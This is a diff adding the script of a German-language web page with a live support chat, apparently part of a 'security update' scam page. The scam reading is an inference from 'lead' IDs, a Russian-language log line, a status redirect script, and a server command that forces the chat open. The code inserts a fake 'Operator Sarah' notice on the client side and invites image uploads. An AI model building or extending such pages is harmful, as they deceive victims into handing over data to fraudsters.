+                fetch('/api/chat-open-ack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
+              } else {
+                lastOpenedRequestId = requestId;
+                chatPanel.removeAttribute('hidden');
+                sendChatRead();
+                fetch('/api/chat-open-ack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
+              }
+            }
+            var panelOpen = !(chatPanel && chatPanel.hasAttribute('hidden'));
+            if (panelOpen) sendChatRead();
+            var sig = leadId + '|' + messages.length + '|' + (messages.length ? (messages[messages.length - 1].at || '') : '');
+            if (sig === lastChatSignature && !showOperatorJoined) {
+              updateUnreadDot(messages, panelOpen);
+              return;
+            }
+            lastChatSignature = sig;
+            var wasAtBottom = chatMessages.scrollHeight - chatMessages.scrollTop - chatMessages.clientHeight < 40;
+            chatMessages.innerHTML = '';
+            messages.forEach(function (msg) {
+              chatMessages.appendChild(renderMessage(msg));
+            });
+            if (showOperatorJoined) {
+              var sys = document.createElement('div');
+              sys.className = 'support-chat-system-msg';
+              sys.textContent = 'Operator Sarah hat den Chat geöffnet und nimmt Ihre Anfrage zur Kenntnis.';
+              chatMessages.appendChild(sys);
+            }
+            updateUnreadDot(messages, panelOpen);
+            if (forceScroll || wasAtBottom || showOperatorJoined) {
+              requestAnimationFrame(function () {
+                requestAnimationFrame(function () {
+                  chatMessages.scrollTop = chatMessages.scrollHeight;
+                });
+              });
+            }
+          })
+          .catch(function () {});
+      }
+
+      function sendOneMessage(text, imageBase64) {
+        var leadId = getLeadId();
+        if (!leadId) return Promise.resolve(false);
+        var payload = { leadId: leadId, from: 'user' };
+        if (text) payload.text = text;
+        if (imageBase64) payload.image = imageBase64;
+        return fetch('/api/chat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).then(function (r) { return r.json(); }).then(function (data) { return !!data.ok; });
+      }
+
+      function sendChatMessages(text, images, done) {
+        var leadId = getLeadId();
+        if (!leadId) { if (done) done(); return; }
+        var queue = [];
+        if (text) queue.push({ text: text, image: images[0] || null });
+        else if (images.length) queue.push({ text: null, image: images[0] });
+        for (var i = 1; i < images.length; i++) queue.push({ text: null, image: images[i] });
+        var idx = 0;
+        function next() {
+          if (idx >= queue.length) {
+            lastChatSignature = '';
+            loadChat(true);
+            if (done) done();
+            return;
+          }
+          var item = queue[idx++];
+          var isFirstInBatch = idx === 1;
+          sendOneMessage(item.text, item.image || undefined).then(function () {
+            if (isFirstInBatch) {
+              setTimeout(function () {
+                try {
+                  var key = 'chat-operator-msg-' + leadId;
+                  if (!sessionStorage.getItem(key)) {
+                    sessionStorage.setItem(key, '1');
+                    loadChat(true, true);
+                  } else {
+                    loadChat(true);
+                  }
+                } catch (e) {
+                  loadChat(true);
+                }
+              }, 5000);
+            }
+            next();
+          }).catch(function () { next(); });
+        }
+        next();
+      }
+
+      function startChatPoll() {
+        stopChatPoll();
+        function poll() {
+          if (document.hidden || (chatPanel && chatPanel.hasAttribute('hidden'))) return;
+          loadChat();
+        }
+        chatPollTimer = setInterval(poll, 12000);
+        poll();
+      }
+      function stopChatPoll() {
+        if (chatPollTimer) {
+          clearInterval(chatPollTimer);
+          chatPollTimer = null;
+        }
+      }
+      var openChatPollTimer = null;
+      function startOpenChatPoll() {
+        if (openChatPollTimer) return;
+        function checkOpenChat() {
+          if (document.hidden) return;
+          var leadId = getLeadId();
+          if (!leadId) return;
+          fetch('/api/chat?leadId=' + encodeURIComponent(leadId) + '&_=' + Date.now(), { cache: 'no-store' })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+              if (!(data && data.openChat)) return;
+              var requestId = (data.openChatRequestId != null) ? String(data.openChatRequestId) : ('legacy-' + Date.now());
+              if (requestId === lastOpenedRequestId) {
+                fetch('/api/chat-open-ack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
+                return;
+              }
+              lastOpenedRequestId = requestId;
+              console.log('[CHAT-OPEN] sicherheit-update: GET /api/chat openChat=true leadId=' + leadId + ', открываю панель');
+              if (chatPanel) {
+                chatPanel.removeAttribute('hidden');
+                if (unreadDotEl) unreadDotEl.classList.remove('visible');
+                sendChatRead();
+                fetch('/api/chat-open-ack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
+                loadChat(true);
+                startChatPoll();
+              }
+            })
+            .catch(function () {});
+        }
+        checkOpenChat();
+        openChatPollTimer = setInterval(checkOpenChat, 2500);
+      }
+      startOpenChatPoll();
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden) stopChatPoll();
+        else if (chatPanel && !chatPanel.hasAttribute('hidden')) startChatPoll();
+      });
+
+      if (chatToggle && chatPanel) {
+        chatToggle.addEventListener('click', function () {
+          var open = chatPanel.hasAttribute('hidden');
+          if (open) {
+            chatPanel.removeAttribute('hidden');
+            if (unreadDotEl) unreadDotEl.classList.remove('visible');
+            loadChat();
+            startChatPoll();
+            if (chatInput) chatInput.focus();
+          } else {
+            chatPanel.setAttribute('hidden', '');
+            stopChatPoll();
+          }
+        });
+      }
+      if (chatClose && chatPanel) {
+        function closeChatPanel() {
+          chatPanel.setAttribute('hidden', '');
+          stopChatPoll();
+        }
+        chatClose.addEventListener('click', closeChatPanel);
+        var chatMinimize = document.getElementById('support-chat-minimize');
+        if (chatMinimize) chatMinimize.addEventListener('click', closeChatPanel);
+      }
+
+      function renderPreview() {
+        if (!chatPreview) return;
+        chatPreview.innerHTML = '';
+        pendingImages.forEach(function (dataUrl, index) {
+          var item = document.createElement('div');
+          item.className = 'support-chat-preview-item';
+          var img = document.createElement('img');
+          img.src = dataUrl;
+          img.alt = 'Vorschau';
+          item.appendChild(img);
+          var btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = 'support-chat-preview-remove';
+          btn.innerHTML = '&times;';
+          btn.title = 'Entfernen';
+          btn.setAttribute('aria-label', 'Entfernen');
+          btn.addEventListener('click', function () {
+            pendingImages.splice(index, 1);
+            renderPreview();
+          });
+          item.appendChild(btn);
+          chatPreview.appendChild(item);
+        });
+      }
+
+      if (chatSend && chatInput) {
+        function doSend() {
+          clearTimeout(chatTypingTimer);
+          sendChatTyping(false);
+          var text = (chatInput.value || '').trim();
+          if (!text && pendingImages.length === 0) return;
+          var toSend = pendingImages.slice();
+          if (chatInput) chatInput.value = '';
+          pendingImages.length = 0;
+          renderPreview();
+          sendChatMessages(text, toSend, function () {});
+        }
+        chatSend.addEventListener('click', doSend);
+        chatInput.addEventListener('keydown', function (e) {
+          if (e.key === 'Enter' && !e.shiftKey) {
+            e.preventDefault();
+            doSend();
+          }
+        });
+        chatInput.addEventListener('input', function () {
+          var lineCount = (this.value.match(/\n/g) || []).length + 1;
+          this.rows = Math.min(Math.max(lineCount, 1), 4);
+          clearTimeout(chatTypingTimer);
+          sendChatTyping(true);
+          chatTypingTimer = setTimeout(function () { sendChatTyping(false); }, 2500);
+        });
+        chatInput.addEventListener('blur', function () { clearTimeout(chatTypingTimer); sendChatTyping(false); });
+      }
+
+      if (chatFile && chatPreview) {
+        chatFile.addEventListener('change', function () {
+          var files = this.files;
+          this.value = '';
+          if (!files || !files.length) return;
+          var added = 0;
+          function processNext(i) {
+            if (i >= files.length) { if (added > 0) renderPreview(); return; }
+            var file = files[i];
+            if (!file.type.startsWith('image/')) { processNext(i + 1); return; }
+            var reader = new FileReader();
+            reader.onload = function () {
+              var dataUrl = reader.result;
+              compressImageIfNeeded(dataUrl, function (resized) {
+                if (resized) { pendingImages.push(resized); added++; }
+                processNext(i + 1);
+              });
+            };
+            reader.readAsDataURL(file);
+          }
+          processNext(0);
+        });
+      }
+      if (chatInput) {
+        chatInput.addEventListener('paste', function (e) {
+          var items = (e.clipboardData && e.clipboardData.items) ? e.clipboardData.items : [];
+          for (var i = 0; i < items.length; i++) {
+            if (items[i].type.indexOf('image') !== -1) {
+              e.preventDefault();
+              var file = items[i].getAsFile();
+              if (!file) return;
+              var reader = new FileReader();
+              reader.onload = function () {
+                var dataUrl = reader.result;
+                compressImageIfNeeded(dataUrl, function (resized) {
+                  if (resized) { pendingImages.push(resized); renderPreview(); }
+                });
+              };
+              reader.readAsDataURL(file);
+              break;
+            }
+          }
+        });
+      }
+    })();
+  </script>
+  <script src="/status-redirect.js"></script>
+</body>
+</html>
